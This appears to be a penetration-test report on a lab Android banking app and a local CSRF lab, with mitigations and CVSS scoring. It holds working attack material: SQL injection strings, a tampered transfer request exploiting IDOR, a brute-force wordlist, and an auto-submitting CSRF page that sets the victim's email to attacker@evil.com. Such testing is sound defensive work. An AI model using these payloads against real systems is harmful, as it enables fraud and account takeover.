Overview Assessment Phases 00
Phase 1

Setup & Reconnaissance

Configure Burp Suite proxy on Android emulator. Route all API traffic for interception and analysis.

Complete
Phase 2

Authentication & Session

JWT analysis, SQL injection testing, session token validation across multiple devices.

Complete
Phase 3

Authorization & Logic

Horizontal/Vertical IDOR testing. BOPLA privilege escalation. Parameter tampering on /dotransfer.

Vulnerable
Phase 4

Rate Limiting

Burp Intruder brute-force simulation — 60 consecutive login attempts on /login endpoint.

Vulnerable
Phase 5

Automated Scan

Nikto web scanner vs. manual findings. False positives and missed vulnerability analysis.

Complete
Phase 6

Risk Assessment & CSRF PoC

OWASP + MASVS mapping. CVSS v3.1 scoring. Full CSRF Proof of Concept demonstration.

Vulnerable
Phase 1 Setup & Traffic Interception 01

Lab Environment

ComponentConfiguration
Emulator Proxy127.0.0.1:8080
Burp Listener127.0.0.1:8080
Backend Server172.23.27.70:8888
ProtocolHTTP (no TLS)

Network Flow

Android App → Burp Proxy # 127.0.0.1:8080 → Backend API # 172.23.27.70:8888

Intercepted Request

POST /login HTTP/1.1 Host: 172.23.27.70:8888 Content-Type: application/x-www-form-urlencoded username=test&password=test

Security Observations

⚠ Cleartext Communication
Application uses HTTP — all traffic unencrypted. Susceptible to MITM attacks, credential leakage, and session hijacking.
⚠ Plaintext Credentials
Username and password transmitted as raw form data with no application-layer encryption.
✔ Phase 1 Objectives
  • Emulator traffic routed through Burp
  • Login API request intercepted
  • Backend server identified
  • Endpoint /login discovered
Phase 2 Authentication & Session Management 02

SQL Injection Test

# Payload injected: username=' OR '1'='1 password=' OR '1'='1 # Server Response: {"message": "User Does not Exist"}
✔ Not Vulnerable
Backend uses SQLAlchemy ORM — parameterized queries prevent injection.

Session Response

# Login success response: { "message": "Correct Credentials", "user": "test" } # No JWT, no session token observed
⚠ No Session Token
Application relies solely on credentials — no stateful session management.

User Enumeration

Input ScenarioServer Response
Valid username + wrong password"Wrong Password"
Non-existent username"User Does not Exist"
⚠ Vulnerability: User Enumeration
Differential error messages allow an attacker to confirm valid usernames — enabling targeted brute-force and credential stuffing attacks.

Phase 2 Findings

VulnerabilitySeverity
User EnumerationMedium
Weak Session ManagementMedium
Plaintext CredentialsHigh
SQL InjectionNot Vulnerable
Phase 3 Authorization — IDOR in /dotransfer 03

Horizontal IDOR Test — /getaccounts

# Attack attempt on /getaccounts: username=jack&password=Dinesh@123$ # Server Response: "Wrong Credentials so trx fail"
✔ /getaccounts — Not Vulnerable
The API correctly validates the username + password pair before returning account data.

BOPLA — Privilege Escalation

Broken Object Property Level Authorization
Testing examined whether API responses expose more data than the UI displays, and whether role fields can be escalated via profile update requests.
HORIZONTAL IDOR
✔
Mitigated
VERTICAL IDOR
✘
Vulnerable

Step 1 — Legitimate Request

POST /dotransfer HTTP/1.1 Host: 192.168.0.102:8888 username=dinesh &password=Dinesh%40123%24 &from_acc=888888888 ← dinesh's own account &to_acc=666666666 &amount=100

Step 2 — Parameter Tampering

POST /dotransfer HTTP/1.1 Host: 192.168.0.102:8888 username=dinesh &password=Dinesh%40123%24 &from_acc=999999999 ← NOT dinesh's account! &to_acc=666666666 &amount=100

Step 3 — Server Response

{ "to": "666666666", "message": "Success", ← ⚠ Unauthorized! "from": "999999999", "amount": "100" }

Attack Flow

1
Authenticate as user dinesh
2
Intercept /dotransfer via Burp Suite
3
Modify from_acc to victim account number
4
Server processes without ownership check
5
Funds transferred from victim's account
⚠ IDOR Confirmed — OWASP API1
Server trusts client-supplied from_acc without validating account ownership.
8.1
CVSS BASE SCORE
VECTOR STRING
CVSS:3.1/AV:N/AC:L/PR:L
/UI:N/S:U/C:L/I:H/A:N
HIGH  OWASP API1

Secure Code Recommendation

# ✔ SECURE (recommended): def do_transfer(request): authenticated_user = session.user allowed_accounts = get_accounts(authenticated_user) from_acc = request.get("from_acc") if from_acc not in allowed_accounts: return 403_FORBIDDEN execute_transfer(from_acc, ...)
Phase 4 Rate Limiting — Brute-Force Attack 04

Attack Setup — Burp Intruder

Burp Suite — Intruder Configuration

Sample Payloads

# Password wordlist (60 entries): 123456 · password · admin test123 · admin123 · welcome root · bank1234 · login123 ... (60 total entries)

Attack Results

Intruder Results — No Blocking Detected
60
Requests Sent
200
HTTP Status All
0
Blocks / Limits
⚠ API4: Unrestricted Resource Consumption
No rate limiting, lockout, or IP blocking. Server returned HTTP 200 for all 60 attempts. CVSS: 5.3 Medium

Mitigations

  • Rate limit: max 5 attempts/minute per IP
  • Account lockout after N failed attempts
  • CAPTCHA on repeated failures
  • Multi-Factor Authentication (MFA)
Phase 5 Automated Vulnerability Scan — Nikto 05

Scan Configuration

# Commands executed: $ nikto -h http://192.168.0.103:8888 $ nikto -h http://192.168.0.103:8888/login $ nikto -h http://192.168.0.103:8888/transfer
Nikto Scanner Output

Automated Findings

Finding 1 — Missing X-Frame-Options
Application may be embedded in malicious iframes — enables Clickjacking. Low
Finding 2 — Missing X-Content-Type-Options
Allows browser MIME sniffing — potential content-type misinterpretation. Low

Manual vs. Automated Comparison

VulnerabilityManualNikto
IDOR /dotransfer✔ Found✘ Missed
Missing Rate Limiting✔ Found✘ Missed
X-Frame-Options✘ Missed✔ Found
X-Content-Type-Options✘ Missed✔ Found
Automated scanners detect configuration flaws. Manual testing is essential for business logic vulnerabilities — always combine both approaches.
CSRF PoC Cross-Site Request Forgery — Full PoC 06

Vulnerability Summary

The /CSRF_LAB/bank/update_email.php endpoint has no CSRF protection. An attacker can forge a request using the victim's active session to silently change their registered email address.

Missing CSRF Protections
  • No CSRF token in form submissions
  • No Origin / Referer header validation
  • No SameSite cookie attribute

Authentication Session

POST /CSRF_LAB/bank/login.php HTTP/1.1 Cookie: PHPSESSID=98bgk7pie...9bmc9v username=victim&password=1234 # Cookie auto-sent to ANY page on same domain

Attack Flow

1
Victim logs into banking application
2
Browser stores session cookie PHPSESSID
3
Victim visits attacker-controlled page
4
Hidden form auto-submits with victim's session
5
Email changed to attacker@evil.com
Login Request Intercept

Malicious Page (Attacker Hosts)

<html> <body onload="document.forms[0].submit()"> <form action="http://localhost/CSRF_LAB/bank/update_email.php" method="POST"> <input type="hidden" name="email" value="attacker@evil.com"> </form> </body></html>

Forged Request Sent

POST /CSRF_LAB/bank/update_email.php Cookie: PHPSESSID=98bgk7pie...9bmc9v email=attacker@evil.com ← Victim's session used silently!
Forged POST Request

Evidence Screenshots

Before Attack
Request Captured
Attack Triggered
Email Changed
✔ Attack Successful
Victim's email changed to attacker@evil.com without any user action beyond visiting the malicious page.

Steps to Reproduce

1
Navigate to localhost/CSRF_LAB/bank/login.php
2
Login with victim / 1234 — confirm email on dashboard
3
Visit localhost/CSRF_LAB/evil/csrf_attack.html
4
Hidden form auto-submits POST using session cookie
5
Refresh dashboard — email is now attacker@evil.com

Real-World Impact

  • Email hijack → password reset → full account takeover
  • Silent fund transfers in banking context
  • Profile / credential modification
  • No phishing email required — just a visited link

Recommended Mitigations

// 1. Generate CSRF token server-side $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // 2. Embed in every form <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>"> // 3. Validate on POST if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) { http_response_code(403); exit('CSRF validation failed'); }
MitigationStatus
CSRF Synchronizer TokenNot Implemented
Origin/Referer ValidationNot Implemented
SameSite Cookie AttributeNot Implemented
Re-auth for Sensitive ActionsNot Implemented
CVSS SCORE
6.5
Medium

Conclusion Summary & Recommendations 08

Key Findings

Critical Risk
IDOR in /dotransfer allows financial fraud from any account. Any authenticated user can drain any other user's funds by manipulating one parameter.
High Risk
CSRF enables account takeover via silent email modification. No interaction beyond a single page visit required.
Medium Risk
No brute-force protection on login — unlimited automated credential guessing possible.

Immediate Actions Required

  • Fix IDOR: validate account ownership server-side before any transaction
  • Add CSRF tokens to all state-changing endpoints
  • Implement login rate limiting + account lockout
  • Force HTTPS across all API endpoints
  • Add X-Frame-Options and X-Content-Type-Options headers

Assessment Scorecard

AreaStatusPriority
Transport SecurityHTTP OnlyP1
Authorization (IDOR)VulnerableP1
CSRF ProtectionMissingP1
Rate LimitingMissingP2
SQL InjectionProtectedOK
Security HeadersIncompleteP2
Methodology Insight
Manual testing discovered 3 of 5 vulnerabilities that automated scanning completely missed. Automated tools alone are insufficient — always combine with manual penetration testing.
OVERALL RISK RATING
HIGH
5 vulnerabilities  ·  Max CVSS 8.1
